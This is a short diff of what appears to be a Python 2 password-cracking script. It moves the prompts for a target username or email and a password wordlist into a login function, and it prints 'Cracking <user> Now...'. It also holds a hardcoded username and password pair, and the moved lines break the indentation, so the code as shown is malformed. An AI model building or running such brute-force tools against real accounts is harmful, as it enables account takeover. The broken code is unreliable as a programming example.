@@ -21,16 +21,6 @@ except ModuleNotFoundError:
     print '[!] Module >Mechanize< Not Found!\n    This module is only available in python 2.x :/\n    Please install mechanize (pip install mechanize) and run the program with python2'
     exit()
 
-
-time.sleep(0.5)
-user = raw_input('[?] Target Username/ID/Email >>> ')
-time.sleep(0.8)
-wrdlstFileName = raw_input('\n[?] Wordlist Directory >>> ')
-try:
-    wordlist = open(wrdlstFileName, 'r')
-except FileNotFoundError:
-    print ('\n[!] File Not Found!')
-    exit()
 CorrectUsername = "Afaq0313khan"
 CorrectPassword = "Afaqkhan0313"
 
@@ -53,6 +43,16 @@ while (loop == 'true'):
 def login():
 	os.system('clear')
 	try:
+time.sleep(0.5)
+user = raw_input('[?] Target Username/ID/Email >>> ')
+time.sleep(0.8)
+wrdlstFileName = raw_input('\n[?] Wordlist Directory >>> ')
+try:
+    wordlist = open(wrdlstFileName, 'r')
+except FileNotFoundError:
+    print ('\n[!] File Not Found!')
+    exit()
+
 time.sleep(0.8)
 print '\n\nCracking '+user+' Now...'
 
